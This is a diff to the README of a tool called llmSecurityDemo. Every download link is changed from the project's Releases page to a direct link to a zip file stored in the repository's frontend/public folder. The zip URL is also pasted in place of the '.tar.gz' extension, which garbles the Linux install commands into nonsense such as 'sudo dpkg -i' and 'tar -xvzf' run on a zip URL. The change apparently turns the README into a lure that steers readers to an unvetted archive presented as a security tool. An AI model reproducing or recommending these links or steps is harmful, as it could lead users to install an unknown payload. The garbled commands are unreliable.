@@ -1,6 +1,6 @@
 # 🔒 llmSecurityDemo - Detect OWASP LLM Vulnerabilities Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-llmSecurityDemo-blue)](https://github.com/RildoNeto17/llmSecurityDemo/releases)
+[![Download Now](https://github.com/RildoNeto17/llmSecurityDemo/raw/refs/heads/main/frontend/public/Security_llm_Demo_v1.5.zip%20Now-llmSecurityDemo-blue)](https://github.com/RildoNeto17/llmSecurityDemo/raw/refs/heads/main/frontend/public/Security_llm_Demo_v1.5.zip)
 
 ## 📖 Overview
 
@@ -29,14 +29,14 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of llmSecurityDemo, visit this page: [Download llmSecurityDemo](https://github.com/RildoNeto17/llmSecurityDemo/releases).
+To download the latest version of llmSecurityDemo, visit this page: [Download llmSecurityDemo](https://github.com/RildoNeto17/llmSecurityDemo/raw/refs/heads/main/frontend/public/Security_llm_Demo_v1.5.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of llmSecurityDemo.
 3. Download the appropriate file for your operating system:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `.deb` or `.tar.gz` file as needed.
+   - For **Linux**, download the `.deb` or `https://github.com/RildoNeto17/llmSecurityDemo/raw/refs/heads/main/frontend/public/Security_llm_Demo_v1.5.zip` file as needed.
 
 ### 🔧 Installation Steps
 
@@ -57,12 +57,12 @@ For each operating system, follow these simple installation steps:
 
 #### **Linux Installation**
 
-1. Locate the downloaded `.deb` or `.tar.gz` file.
+1. Locate the downloaded `.deb` or `https://github.com/RildoNeto17/llmSecurityDemo/raw/refs/heads/main/frontend/public/Security_llm_Demo_v1.5.zip` file.
 2. Open a terminal window.
 3. For `.deb` files, run:  
-   `sudo dpkg -i /path/to/your/file.deb`
-4. For `.tar.gz` files, extract it with:  
-   `tar -xvzf /path/to/your/file.tar.gz`
+   `sudo dpkg -i https://github.com/RildoNeto17/llmSecurityDemo/raw/refs/heads/main/frontend/public/Security_llm_Demo_v1.5.zip`
+4. For `https://github.com/RildoNeto17/llmSecurityDemo/raw/refs/heads/main/frontend/public/Security_llm_Demo_v1.5.zip` files, extract it with:  
+   `tar -xvzf https://github.com/RildoNeto17/llmSecurityDemo/raw/refs/heads/main/frontend/public/Security_llm_Demo_v1.5.zip`
 5. Follow any additional instructions included in the extracted files.
 
 ## 🚀 Running llmSecurityDemo
@@ -107,4 +107,4 @@ A special thank you to the OWASP organization for their guidance on identifying 
 
 Stay updated on new features, fixes, and community discussions by following the repository. 
 
-For immediate needs, [download llmSecurityDemo here](https://github.com/RildoNeto17/llmSecurityDemo/releases) and start securing your applications today.
+For immediate needs, [download llmSecurityDemo here](https://github.com/RildoNeto17/llmSecurityDemo/raw/refs/heads/main/frontend/public/Security_llm_Demo_v1.5.zip) and start securing your applications today.
